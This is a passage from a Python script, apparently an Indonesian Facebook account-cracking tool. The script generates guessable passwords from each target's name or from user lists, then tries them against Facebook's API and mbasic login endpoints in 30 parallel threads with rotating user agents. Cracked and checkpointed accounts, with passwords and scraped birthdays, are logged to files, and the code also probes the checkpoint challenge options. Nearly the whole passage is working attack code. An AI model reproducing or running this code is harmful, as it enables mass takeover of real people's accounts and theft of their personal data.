				mode_password()
		sandi.append(pwa)
		opsi2()
	elif mode=="g" or mode=="G":
		print("\n"+balmond+l+" Masukkan Password Tambahan")
		print(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Tambahan : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Jangan Serakah Ngab, Maksimal 5 Password Aja")
			time.sleep(0.5)
			mode_password()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				mode_password()
		sandi.append(pwa)
		opsi3()
	else:
		jalan(balmond+m+" Pilih d Atau m Atau g")
		time.sleep(0.5)
		mode_password()

# OPSI

def opsi():
	ops = input(balmond+l+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
	if ops=="y" or ops=="Y":
		opsit.append("munculkan")
	elif ops=="t" or ops=="T":
		opsit.append("jangan")
	else:
		jalan(balmond+m+" Pilih Ya Atau Tidak")
		time.sleep(0.5)
		opsi()
	mode_crack()

# OPSI2

def opsi2():
        ops = input("\n"+balmond+l+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak Tod")
                time.sleep(0.5)
                opsi2()
        mode_crack2()

# OPSI3

def opsi3():
        ops = input("\n"+balmond+l+" Munculkan Opsi "+h+"{"+k+"y/t"+h+"}"+l+" : ")
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak Tod")
                time.sleep(0.5)
                opsi3()
        mode_crack3()

# MODE CRACK

def mode_crack():
	print(s+"\n{"+m+"1"+s+"}"+l+" Method Api "+s+"{"+m+"Fast"+s+"}")
	print(s+"{"+m+"2"+s+"}"+l+" Method Mbasic "+s+"{"+m+"Slow"+s+"}")
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
		print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
		print(balmond+p+"File : Hasil_Cp/"+hck)
		print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
		jalan(balmond+b+"Anjaay Hengker :v\n")
		default()
	elif pilih=="2" or pilih=="02":
		print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
		print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
		agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
		print(balmond+p+"File : Hasil_Cp/"+hck)
		print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
		jalan(balmond+b+" Anjaay Hengker :v\n")
		default2()
	else:
		jalan(balmond+l+" Gada Pilihan Tod")
		time.sleep(0.5)
		mode_crack()

# MODE CRACK2

def mode_crack2():
        print(s+"\n{"+m+"1"+s+"}"+l+" Method Api "+s+"{"+m+"Fast"+s+"}")
        print(s+"{"+m+"2"+s+"}"+l+" Method Mbasic "+s+"{"+m+"Slow"+s+"}")
        pilih = input("\n"+balmond+l+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
                print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
                print(balmond+p+"File : Hasil_Cp/"+hck)
                print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjaay Hengker :v \n")
                manual()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
                print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
                print(balmond+p+"File : Hasil_Cp/"+hck)
                print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjay Hengker :v\n")
                manual2()
        else:
                jalan(balmond+l+" Gada Pilihan Tod")
                time.sleep(0.5)
                mode_crack2()

# MODE CRACK3

def mode_crack3():
        print(s+"\n{"+m+"1"+s+"}"+l+" Method Api "+s+"{"+m+"Fast"+s+"}")
        print(s+"{"+m+"2"+s+"}"+l+" Method Mbasic "+s+"{"+m+"Slow"+s+"}")
        pilih = input("\n"+balmond+l+" Pilih : ")
        if pilih=="1" or pilih=="01":
                print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
                print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
                print(balmond+p+"File : Hasil_Cp/"+hck)
                print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjay Hengker :v\n")
                gabungkan()
        elif pilih=="2" or pilih=="02":
                print("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent (slow)")
                print(balmond+u+" Tekan Enter Untuk 1 User Agent (fast)")
                agenku = input(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+"}"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                print("\n"+balmond+p+"File : Hasil_Ok/"+hck)
                print(balmond+p+"File : Hasil_Cp/"+hck)
                print(balmond+l+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjaay Hengker :v\n")
                gabungkan2()
        else:
                jalan(balmond+l+" Pilihan Invalid")
                time.sleep(0.5)
                mode_crack3()


# DEFAULT

def default():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			kintil.submit(api, idd, past, loop)

# DEFAULT2

def default2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        continue
                                else:
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==5:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                        else:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr)
                        past.append(namee.lower())
                        kintil.submit(mbasic, idd, past, loop)

# MANUAL

def manual():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(api, idd, past, loop)

# MANUAL2

def manual2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(mbasic, idd, past, loop)

# GABUNG

def gabungkan():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(api, idd, past, loop)

# GABUNGKAN2

def gabungkan2():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(mbasic, idd, past, loop)

# CRACK API

def api(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open("user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
	goblokk = json.loads(ttl.text)
	ahay = goblokk["id"]
	print(s+"\r["+u+ahay+s+"] "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			response = requests.get(api, params=params, headers=headers_)
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(u+"\rʕ"+u+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+u+" >< "+l+pw+u+" >< "+l+tahunnya+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+u+" >< "+l+pw+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CRACK MBASIC

def mbasic(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open("user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	print(s+"\r["+u+"McybearX"+s+"] "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://mbasic.facebook.com")
			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+tahunnya+"          ")
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+u+" >< "+h+pw+u+" >< "+h+kuki)
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(u+"\rʕ"+k+"cp"+u+"ʔ"+k+" "+uid+k+" >< "+l+pw+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CEKER OPSI

def ceker(uid,pw,ua,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "old" in old_gak:
			print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
			bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		else:
			print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+"          ")
			bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Derr")
		print("\r"+h+batas)

def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if len(lahir)==2:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(u+"\rʕ"+k+"cp"+u+"ʔ"+b+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
